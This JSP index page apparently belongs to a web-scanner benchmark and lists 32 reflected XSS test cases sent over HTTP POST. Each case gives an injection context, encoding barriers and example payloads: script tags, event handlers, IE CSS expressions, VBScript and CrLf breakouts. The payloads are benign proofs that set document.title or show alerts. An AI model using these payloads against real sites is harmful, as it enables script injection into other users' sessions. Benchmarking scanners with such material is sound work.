<%@ page contentType="text/html; charset=ISO-8859-1" pageEncoding="ISO-8859-1"%>
<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd"><html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1">
<title>Evaluation of Reflected XSS Detection Accuracy - HTTP POST Method</title>
</head>
<body>
<font size="5">Test Cases:</font><br><br>
<B><a href="Case01-Tag2HtmlPageScope.jsp">Case01-Tag2HtmlPageScope.jsp</a></B><br>
  Injection of tags to the scope of the HTML page.<br>
  <U>Barriers:</U><br>
  None<br>
  <U>Sample Exploit Structures:</U><br>
  &lt;script&gt;[exploit code]&lt;/script&gt;<br>
  &lt;input type=text [dhtmlevent]=&quot;[code]&quot;&gt;<br>
  &lt;[customtag] style=&quot;width: expression&#40;[exploit code]&#41;;&quot;&gt;<br>
  <U>Examples:</U><br>
  Exploit: &#60;script&#62;document&#46;title&#61;&#34;Exploit&#34;&#59;&#60;&#47;script&#62;<br>
  Silent Exploit: &lt;img src=&quot;a&quot; onerror=&quot;javascript:document&#46;title=document&#46;domain&quot;&gt;<br>
  IE Custom Tag Exploit: &lt;sectooladdict style=&quot;width: expression&#40;document&#46;title=document&#46;domain&#41;;&quot;&gt;<br>
  <br>
<B><a href="Case02-Tag2TagScope.jsp">Case02-Tag2TagScope.jsp</a></B><br>
Injection of tags to the scope of an HTML tag.<br>
  <U>Barriers:</U><br>
  None<br>
  <U>Sample Exploit Structures:</U><br>
  &lt;/scope-tag&gt;&lt;script&gt;[exploit code]&lt;/script&gt;<br>
  &lt;/scope-tag&gt;&lt;input type=text [dhtmlevent]=&quot;[code]&quot;&gt;<br>
  &lt;/scope-tag&gt;&lt;[customtag] style=&quot;width: expression&#40;[exploit code]&#41;;&quot;&gt;<br>
  <U>Examples:</U><br>
  Exploit: &lt;/textarea&gt;&#60;script&#62;document&#46;title&#61;&#34;Exploit&#34;&#59;&#60;&#47;script&#62;<br>
  Silent Exploit: &lt;/textarea&gt;&lt;img src=&quot;a&quot; onerror=&quot;javascript:document&#46;title=document&#46;domain&quot;&gt;<br>
  IE Custom Tag Exploit: &lt;/textarea&gt;&lt;sectooladdict style=&quot;width: expression&#40;document&#46;title=document&#46;domain&#41;;&quot;&gt;<br>
  <br>
<B><a href="Case03-Tag2TagStructure.jsp">Case03-Tag2TagStructure.jsp</a></B><br>
Injection of tags to the scope of an HTML tag.<br>
  <U>Barriers:</U><br>
  None<br>
  <U>Sample Exploit Structures:</U><br>
  [string-delimiter ('/")]&gt;&lt;script&gt;[exploit code]&lt;/script&gt;<br>
  [string-delimiter ('/")]&gt;&lt;input type=text [dhtmlevent]=&quot;[code]&quot;&gt;<br>
  [string-delimiter ('/")]&gt;&lt;[customtag] style=&quot;width: expression&#40;[exploit code]&#41;;&quot;&gt;<br>
  <U>Examples:</U><br>
  Exploit: &#39;&quot;&gt;&#60;script&#62;document&#46;title&#61;&#34;Exploit&#34;&#59;&#60;&#47;script&#62;<br>
  Silent Exploit: &#39;&quot;&gt;&lt;img src=&quot;a&quot; onerror=&quot;javascript:document&#46;title=document&#46;domain&quot;&gt;<br>
  IE Custom Tag Exploit: &#39;&quot;&gt;&lt;sectooladdict style=&quot;width: expression&#40;document&#46;title=document&#46;domain&#41;;&quot;&gt;<br>
  <br>
<B><a href="Case04-Tag2HtmlComment.jsp">Case04-Tag2HtmlComment.jsp</a></B><br>
  Injection of tags to the scope of an HTML comment.<br>
  <U>Barriers:</U><br>
  None<br>
  <U>Sample Exploit Structures:</U><br>
  --&gt;&lt;script&gt;[exploit code]&lt;/script&gt;<br>
  --&gt;&lt;input type=text [dhtmlevent]=&quot;[code]&quot;&gt;<br>
  --&gt;&lt;[customtag] style=&quot;width: expression&#40;[exploit code]&#41;;&quot;&gt;<br>
  <U>Examples:</U><br>
  Exploit: --&gt;&#60;script&#62;document&#46;title&#61;&#34;Exploit&#34;&#59;&#60;&#47;script&#62;<br>
  Silent Exploit: --&gt;&lt;img src=&quot;a&quot; onerror=&quot;javascript:document&#46;title=document&#46;domain&quot;&gt;<br>
  IE Custom Tag Exploit: --&gt;&lt;sectooladdict style=&quot;width: expression&#40;document&#46;title=document&#46;domain&#41;;&quot;&gt;<br>
  <br>
<B><a href="Case05-Tag2Frameset.jsp">Case05-Tag2Frameset.jsp</a></B><br>
  Injection of tags to the scope of an HTML comment.<br>
  <U>Barriers:</U><br>
  None<br>
  <U>Sample Exploit Structures:</U><br>
  &quot;&gt;&lt;frame name=frame3 id=frame3 src=&quot;javascript:[exploit code];<br>
  javascript:[exploit code]; (within the src property)<br>
  <U>Examples:</U><br>
  Exploit: &quot;&gt;&lt;frame name=frame3 id=frame3 src=&quot;javascript:alert(&#39;xss&#39;);<br>
  Silent Exploit: javascript:alert(&#39;xss&#39;);<br>
  <br>
<B><a href="Case06-Event2TagScope.jsp">Case06-Event2TagScope.jsp</a></B><br>
  Injection of events/properties to the scope of an HTML tag.<br>
  <U>Barriers:</U><br>
  Partial HTML encoding (angle brackets)<br>
  <U>Sample Exploit Structures:</U><br>
  [property delimiter ('/")][space][dhtml event]=[property delimiter ('/")][exploit code];<br>
  [property delimiter ('/")][space][code supporting property]=[property delimiter ('/")][javascript/vbscript]:[exploit code];<br>
  [property delimiter ('/")][space]style=[property delimiter ('/")]width: expression&#40;[exploit code]&#41;;<br>
  <U>Examples:</U><br>
  Exploit: a&quot; onMouseOver=&quot;document&#46;title=document&#46;domain;<br>
  Auto Executed Exploit: a&quot; onerror=&quot;document&#46;title=document&#46;domain;<br>
  IE Style Exploit: a&quot; style=&quot;width: expression&#40;document&#46;title=document&#46;domain&#41;;<br>
  <br>
  Can be tested only on IE
<B><a href="Case07-Event2DoubleQuotePropertyScope.jsp">Case07-Event2DoubleQuotePropertyScope.jsp</a></B><br>
  Injection of events/properties to the scope of an HTML property (Double Quote Delimiter) .<br>
  <U>Barriers:</U><br>
  Partial HTML encoding (angle brackets)<br>
  Partial HTML encoding (single quote)<br>
  <U>Sample Exploit Structures:</U><br>
  [double quote delimiter (")][space][dhtml event]=[double quote delimiter (")][exploit code];<br>
  [double quote delimiter (")][space][code supporting property]=[double quote delimiter (")][javascript/vbscript]:[exploit code];<br>
  [double quote delimiter (")][space]style=[double quote delimiter (")]width: expression&#40;[exploit code]&#41;;<br>
  <U>Examples:</U><br>
  Exploit: a&quot; onMouseOver=&quot;document&#46;title=document&#46;domain;<br>
  Auto Executed Exploit: a&quot; onerror=&quot;document&#46;title=document&#46;domain;<br>
  IE Style Exploit: a&quot; style=&quot;width: expression&#40;document&#46;title=document&#46;domain&#41;;<br>
  <br>
<B><a href="Case08-Event2SingleQuotePropertyScope.jsp">Case08-Event2SingleQuotePropertyScope.jsp</a></B><br>
  Injection of events/properties to the scope of an HTML property (Single Quote Delimiter).<br>
  <U>Barriers:</U><br>
  Partial HTML encoding (angle brackets)<br>
  Partial HTML encoding (double quote)<br>
  <U>Sample Exploit Structures:</U><br>
  [single quote delimiter (')][space][dhtml event]=[single quote delimiter (')][exploit code];<br>
  [single quote delimiter (')][space][code supporting property]=[single quote delimiter (')][javascript/vbscript]:[exploit code];<br>
  [single quote delimiter (')][space]style=[single quote delimiter (')]width: expression&#40;[exploit code]&#41;;<br>
  <U>Examples:</U><br>
  Exploit: a&#39; onMouseOver=&#39;document&#46;title=document&#46;domain;<br>
  Auto Executed Exploit: a&#39; onerror=&#39;document&#46;title=document&#46;domain;<br>
  IE Style Exploit: a&#39; style=&#39;width: expression&#40;document&#46;title=document&#46;domain&#41;;<br>
  <br>
<B><a href="Case09-SrcProperty2TagStructure.jsp">Case09-SrcProperty2TagStructure.jsp</a></B><br>
  Injection of src properties to the scope of an HTML tag.<br>
  <U>Barriers:</U><br>
  Partial HTML encoding (angle brackets, quote, double quote)<br>
  <U>Sample Exploit Structures:</U><br>
  [value][space]src=[path to local or remote malicious JS file]<br>
  <U>Examples:</U><br>
  RFI Exploit: value src=http://localhost:8080/wavsep/active/RXSS-Detection-Evaluation-POST/exploit.js<br>
  LFI Exploit: value src=exploit.js<br>
  <br>
<B><a href="Case10-Js2DoubleQuoteJsEventScope.jsp">Case10-Js2DoubleQuoteJsEventScope.jsp</a></B><br>
  Injection of Javascript to the scope of an HTML/Javascript event (Double Quote Delimiter).<br>
  <U>Barriers:</U><br>
  Partial HTML encoding (angle brackets)<br>
  Partial HTML encoding (double quote)<br>
  <U>Sample Exploit Structures:</U><br>
  [syntax delimiters ('/]/}/CrLf/)/;)][javascript exploit code]<br>
  [syntax delimiters ('/]/}/CrLf/)/;)][javascript exploit code][comment (//)]<br>
  <U>Examples:</U><br>
  Exploit: john&#39;; document.title='exploit<br>
  Independent Exploit: john&#39;; alert('xss');//<br>
  <br>
<B><a href="Case11-Js2SingleQuoteJsEventScope.jsp">Case11-Js2SingleQuoteJsEventScope.jsp</a></B><br>
  Injection of Javascript to the scope of an HTML/Javascript event (Single Quote Delimiter).<br>
  <U>Barriers:</U><br>
  Partial HTML encoding (angle brackets)<br>
  Partial HTML encoding (single quote)<br>
  <U>Sample Exploit Structures:</U><br>
  [syntax delimiters ("/]/}/CrLf/)/;)][javascript exploit code]<br>
  [syntax delimiters ("/]/}/CrLf/)/;)][javascript exploit code][comment (//)]<br>
  <U>Examples:</U><br>
  Exploit: john&quot;; document.title=&quot;exploit<br>
  Independent Exploit: john&quot;; alert(&quot;xss&quot;);//<br>
  <br>
<B><a href="Case12-Js2JsEventScope.jsp?">Case12-Js2JsEventScope.jsp</a></B><br>
  Injection of Javascript to the scope of an HTML/Javascript event (Any Delimiter).<br>
  <U>Barriers:</U><br>
  Partial HTML encoding (angle brackets)<br>
  Partial HTML encoding (double quote)<br>
  Partial HTML encoding (single quote)<br>
  <U>Sample Exploit Structures:</U><br>
  [syntax delimiters (CrLf/]/}/)/;)][javascript exploit code]<br>
  [syntax delimiters (CrLf/]/}/)/;)][javascript exploit code][comment (//)]<br>
  <U>Examples:</U><br>
  Exploit: 1234; alert(document.domain)<br>
  Independent Exploit: 1234; alert(document.domain);//<br>
  <br>
<B><a href="Case13-Vbs2DoubleQuoteVbsEventScope.jsp">Case13-Vbs2DoubleQuoteVbsEventScope.jsp</a></B><br>
  Injection of VBScript to the scope of an HTML/VBScript event (Double Quote Delimiter).<br>
  (Use a proxy to send CrLf characters, since the form will encode them)<br>
  <U>Barriers:</U><br>
  Partial HTML encoding (angle brackets)<br>
  Partial HTML encoding (double quote)<br>
  <U>Sample Exploit Structures:</U><br>
  [syntax delimiters ('/CrLf/]/))][VBScript exploit code]<br>
  [syntax delimiters ('/CrLf/]/))][VBScript exploit code][comment ('/Rem)]<br>
  <U>Examples:</U><br>
  Exploit: John&#39;%0A%0D MsgBox 'xss<br>
  Independent Exploit: John&#39;%0A%0D MsgBox 'xss'%0A%0DRem aa <br>
  Works only on IE <br>
  <br>
<B><a href="Case14-Vbs2SingleQuoteVbsEventScope.jsp">Case14-Vbs2SingleQuoteVbsEventScope.jsp</a></B><br>
  Injection of VBScript to the scope of an HTML/VBScript event (Single Quote Delimiter).<br>
  (Use a proxy to send CrLf characters, since the form will encode them)<br>
  <U>Barriers:</U><br>
  Partial HTML encoding (angle brackets)<br>
  Partial HTML encoding (single quote)<br>
  <U>Sample Exploit Structures:</U><br>
  [syntax delimiters ("/CrLf/]/))][VBScript exploit code]<br>
  [syntax delimiters ("/CrLf/]/))][VBScript exploit code][CrLf][comment (Rem)]<br>
  <U>Examples:</U><br>
  Exploit: John&quot;%0A%0D MsgBox "xss<br>
  Independent Exploit: John&quot;%0A%0D MsgBox "xss"%0A%0DRem aa <br>
  Works only on IE <br>
  <br>
<B><a href="Case15-Vbs2VbsEventScope.jsp">Case15-Vbs2VbsEventScope.jsp</a></B><br>
  Injection of VBScript to the scope of an HTML/VBScript event (Any Delimiter).<br>
  (Use a proxy to send CrLf characters, since the form will encode them)<br>
  <U>Barriers:</U><br>
  Partial HTML encoding (angle brackets)<br>
  Partial HTML encoding (double quote)<br>
  Partial HTML encoding (single quote)<br>
  <U>Sample Exploit Structures:</U><br>
  [syntax delimiters (CrLf/]/))][VBScript exploit code]<br>
  [syntax delimiters (CrLf/]/))][VBScript exploit code][CrLf][comment (Rem)]<br>
  <U>Examples:</U><br>
  Exploit: 1234%0A%0D MsgBox Document.Domain<br>
  Independent Exploit: 1234%0A%0D MsgBox Document.Domain%0A%0DRem aa <br>
  Works only on IE <br>
  <br>
<B><a href="Case16-Js2ScriptSupportingProperty.jsp">Case16-Js2ScriptSupportingProperty.jsp</a></B><br>
  Injection of Javascript into the scope of a script supporting property.<br>
  (Assume RFI/LFI can not be used for the sample property)<br>
  <U>Barriers:</U><br>
  Partial HTML encoding (angle brackets)<br>
  Partial HTML encoding (double quote)<br>
  Partial HTML encoding (single quote)<br>
  Simple RFI Signature Validation/Removal (http)<br>
  <U>Sample Exploit Structures:</U><br>
  [javascript/vscript]:[exploit code]<br>
  [property-name]: expression&#40;[exploit code]&#41;;<br>
  <U>Examples:</U><br>
  Exploit: javascript:alert(document.domain);<br>
  IE Style Property Exploit: width: expression&#40;alert(document.domain)&#41;; <br>
  <br>
<B><a href="Case17-Js2PropertyJsScopeDoubleQuoteDelimiter.jsp">Case17-Js2PropertyJsScopeDoubleQuoteDelimiter.jsp</a></B><br>
  Injection of Javascript into the scope of javascript code within property (Double Quote String Delimiter).<br>
  <U>Barriers:</U><br>
  Partial HTML encoding (angle brackets)<br>
  Partial HTML encoding (single quote)<br>
  <U>Sample Exploit Structures:</U><br>
  value";[exploit code]<br>
  <U>Examples:</U><br>
  Exploit: david"; alert("exploit");//<br>
  <br>
<B><a href="Case18-Js2PropertyJsScopeSingleQuoteDelimiter.jsp">Case18-Js2PropertyJsScopeSingleQuoteDelimiter.jsp</a></B><br>
  Injection of Javascript into the scope of javascript code within property (Single Quote String Delimiter).<br>
  <U>Barriers:</U><br>
  Partial HTML encoding (angle brackets)<br>
  Partial HTML encoding (double quote)<br>
  <U>Sample Exploit Structures:</U><br>
  value';[exploit code]<br>
  <U>Examples:</U><br>
  Exploit: david'; alert('exploit');//<br>
  <br>
<B><a href="Case19-Js2PropertyJsScope.jsp">Case19-Js2PropertyJsScope.jsp</a></B><br>
  Injection of Javascript into the scope of javascript code within property (No String Delimiter).<br>
  <U>Barriers:</U><br>
  Partial HTML encoding (angle brackets)<br>
  Partial HTML encoding (double quote)<br>
  Partial HTML encoding (single quote)<br>
  <U>Sample Exploit Structures:</U><br>
  [exploit code]<br>
  <U>Examples:</U><br>
  Exploit: 1; alert(document.domain);<br>
  <br>
<B><a href="Case20-Vbs2PropertyVbsScopeDoubleQuoteDelimiter.jsp">Case20-Vbs2PropertyVbsScopeDoubleQuoteDelimiter.jsp</a></B><br>
  Injection of VBScript into the scope of VBScript code within property (Double Quote String Delimiter).<br>
  <U>Barriers:</U><br>
  Partial HTML encoding (angle brackets)<br>
  Partial HTML encoding (single quote)<br>
  <U>Sample Exploit Structures:</U><br>
  value"[CrLf][exploit code]<br>
  <U>Examples:</U><br>
  Exploit: aa" & msgbox("exploit") & "aa<br>
  Exploit (URL Encoded): aa%22%20%26%20msgbox(%22exploit%22)%20%26%20%22aa<br>
  Works only on IE <br>
  <br>
<B><a href="Case21-Vbs2PropertyVbsScope.jsp">Case21-Vbs2PropertyVbsScope.jsp</a></B><br>
  Injection of VBScript into the scope of VBScript code within property (No String Delimiter).<br>
  <U>Barriers:</U><br>
  Partial HTML encoding (angle brackets)<br>
  Partial HTML encoding (double quote)<br>
  Partial HTML encoding (single quote)<br>
  <U>Sample Exploit Structures:</U><br>
  value'[CrLf][exploit code]<br>
  <U>Examples:</U><br>
  Exploit: msgbox (document.domain) <br>
  Works only on IE <br>
  <br>
<B><a href="Case22-Js2ScriptTagDoubleQuoteDelimiter.jsp">Case22-Js2ScriptTagDoubleQuoteDelimiter.jsp</a></B><br>
  Injection of Javascript into the scope of a script tag (Javascript, Double Quote String Delimiter).<br>
  <U>Barriers:</U><br>
  Partial HTML encoding (angle brackets)<br>
  Partial HTML encoding (single quote)<br>
  <U>Sample Exploit Structures:</U><br>
  value";[exploit code]<br>
  <U>Examples:</U><br>
  Exploit: david";document.title="exploit <br>
  Independent Exploit: david";alert("exploit");// <br>
  <br>
<B><a href="Case23-Js2ScriptTagSingleQuoteDelimiter.jsp">Case23-Js2ScriptTagSingleQuoteDelimiter.jsp</a></B><br>
  Injection of Javascript into the scope of a script tag (Javascript, Single Quote String Delimiter).<br>
  <U>Barriers:</U><br>
  Partial HTML encoding (angle brackets)<br>
  Partial HTML encoding (double quote)<br>
  <U>Sample Exploit Structures:</U><br>
  value';[exploit code]<br>
  <U>Examples:</U><br>
  Exploit: david';document.title='exploit <br>
  Independent Exploit: david';alert('exploit');// <br>
  <br>
<B><a href="Case24-Js2ScriptTag.jsp">Case24-Js2ScriptTag.jsp</a></B><br>
  Injection of Javascript into the scope of a script tag (Javascript, No String Delimiter).<br>
  <U>Barriers:</U><br>
  Partial HTML encoding (angle brackets)<br>
  Partial HTML encoding (double quote)<br>
  Partial HTML encoding (single quote)<br>
  <U>Sample Exploit Structures:</U><br>
  value;[exploit code]<br>
  <U>Examples:</U><br>
  Exploit: 1234;document.title=document.domain <br>
  Independent Exploit: 1234;document.title=document.domain;// <br>
  <br>
<B><a href="Case25-Vbs2ScriptTagDoubleQuoteDelimiter.jsp">Case25-Vbs2ScriptTagDoubleQuoteDelimiter.jsp</a></B><br>
  Injection of VBScript into the scope of a script tag (VBScript, Double Quote String Delimiter).<br>
  <U>Barriers:</U><br>
  Partial HTML encoding (angle brackets)<br>
  Partial HTML encoding (single quote)<br>
  <U>Sample Exploit Structures:</U><br>
  value"[CrLf][exploit code]<br>
  <U>Examples:</U><br>
  Exploit (Send via Proxy): david"%0A%0Dmsgbox "exploit <br>
  Works only on IE <br>
  <br>
<B><a href="Case26-Vbs2ScriptTag.jsp">Case26-Vbs2ScriptTag.jsp</a></B><br>
  Injection of VBScript into the scope of a script tag (VBScript, No String Delimiter).<br>
  <U>Barriers:</U><br>
  Partial HTML encoding (angle brackets)<br>
  Partial HTML encoding (double quote)<br>
  Partial HTML encoding (single quote)<br>
  <U>Sample Exploit Structures:</U><br>
  value[CrLf][exploit code]<br>
  <U>Examples:</U><br>
  Exploit (Send via Proxy): 1234%0A%0Dmsgbox document.domain%0A%0D <br>
  Works only on IE <br>
  <br>
<B><a href="Case27-Js2ScriptTagOLCommentScope.jsp">Case27-Js2ScriptTagOLCommentScope.jsp</a></B><br>
  Injection of Javascript into the scope of a script tag single line comment.<br>
  <U>Barriers:</U><br>
  Partial HTML encoding (angle brackets)<br>
  <U>Sample Exploit Structures:</U><br>
  [CrLf][exploit code]<br>
  <U>Examples:</U><br>
  Exploit (Send via Proxy): %0A%0Ddocument.title=document.domain <br>
  Independent Exploit (Send via Proxy): %0A%0Ddocument.title=document.domain;// <br>
  <br>
<B><a href="Case28-Js2ScriptTagMLCommentScope.jsp">Case28-Js2ScriptTagMLCommentScope.jsp</a></B><br>
  Injection of Javascript into the scope of a script tag multiline comment.<br>
  <U>Barriers:</U><br>
  Partial HTML encoding (angle brackets)<br>
  <U>Sample Exploit Structures:</U><br>
  */[exploit code]<br>
  <U>Examples:</U><br>
  Exploit: */;document.title=document.domain;/* <br>
  <br>
<B><a href="Case29-Vbs2ScriptTagOLCommentScope.jsp">Case29-Vbs2ScriptTagOLCommentScope.jsp</a></B><br>
  Injection of VBScript into the scope of a script tag single line comment.<br>
  <U>Barriers:</U><br>
  Partial HTML encoding (angle brackets)<br>
  <U>Sample Exploit Structures:</U><br>
  [CrLf][exploit code]<br>
  <U>Examples:</U><br>
  Exploit (Send via Proxy): 1234%0A%0Dmsgbox document.domain%0A%0D <br>
  Works only on IE <br>
  <br>
<B><a href="Case30-Tag2HtmlPageScopeMultipleVulnerabilities.jsp">Case30-Tag2HtmlPageScopeMultipleVulnerabilities.jsp</a></B><br>
  Injection of tags to the scope of the HTML page (Multiple RXSS Vulnerabilities).<br>
  <U>Barriers:</U><br>
  None<br>
  <U>Sample Exploit Structures:</U><br>
  [CrLf][exploit code]<br>
  <U>Sample Exploit Structures:</U><br>
  &lt;script&gt;[exploit code]&lt;/script&gt;<br>
  &lt;input type=text [dhtmlevent]=&quot;[code]&quot;&gt;<br>
  &lt;[customtag] style=&quot;width: expression&#40;[exploit code]&#41;;&quot;&gt;<br>
  <U>Examples:</U><br>
  Exploit: &#60;script&#62;document&#46;title&#61;&#34;Exploit&#34;&#59;&#60;&#47;script&#62;<br>
  Silent Exploit: &lt;img src=&quot;a&quot; onerror=&quot;javascript:document&#46;title=document&#46;domain&quot;&gt;<br>
  IE Custom Tag Exploit: &lt;sectooladdict style=&quot;width: expression&#40;document&#46;title=document&#46;domain&#41;;&quot;&gt;<br>
  <br>
<B><a href="Case31-Tag2HtmlPageScopeDuringException.jsp">Case31-Tag2HtmlPageScopeDuringException.jsp</a></B><br>
  Injection of tags to the scope of the HTML page during an exception.<br>
  <U>Barriers:</U><br>
  None<br>
  <U>Sample Exploit Structures:</U><br>
  '&lt;script&gt;[exploit code]&lt;/script&gt;<br>
  '&lt;input type=text [dhtmlevent]=&quot;[code]&quot;&gt;<br>
  '&lt;[customtag] style=&quot;width: expression&#40;[exploit code]&#41;;&quot;&gt;<br>
  <U>Examples:</U><br>
  Exploit: '&#60;script&#62;document&#46;title&#61;&#34;Exploit&#34;&#59;&#60;&#47;script&#62;<br>
  Silent Exploit: '&lt;img src=&quot;a&quot; onerror=&quot;javascript:document&#46;title=document&#46;domain&quot;&gt;<br>
  IE Custom Tag Exploit: '&lt;sectooladdict style=&quot;width: expression&#40;document&#46;title=document&#46;domain&#41;;&quot;&gt;<br>
  <br>
<B><a href="Case32-Tag2HtmlPageScopeValidViewstateRequired.jsp">Case32-Tag2HtmlPageScopeValidViewstateRequired.jsp</a></B><br>
  Injection of tags to the scope of the HTML page (Viewstate Required).<br>
  <U>Barriers:</U><br>
  None<br>
  <U>Sample Exploit Structures:</U><br>
  &lt;script&gt;[exploit code]&lt;/script&gt;<br>
  &lt;input type=text [dhtmlevent]=&quot;[code]&quot;&gt;<br>
  &lt;[customtag] style=&quot;width: expression&#40;[exploit code]&#41;;&quot;&gt;<br>
  <U>Examples:</U><br>
  Exploit: &#60;script&#62;document&#46;title&#61;&#34;Exploit&#34;&#59;&#60;&#47;script&#62;<br>
  Silent Exploit: &lt;img src=&quot;a&quot; onerror=&quot;javascript:document&#46;title=document&#46;domain&quot;&gt;<br>
  IE Custom Tag Exploit: &lt;sectooladdict style=&quot;width: expression&#40;document&#46;title=document&#46;domain&#41;;&quot;&gt;<br>
  <br>

<br><br>

</body>
</html>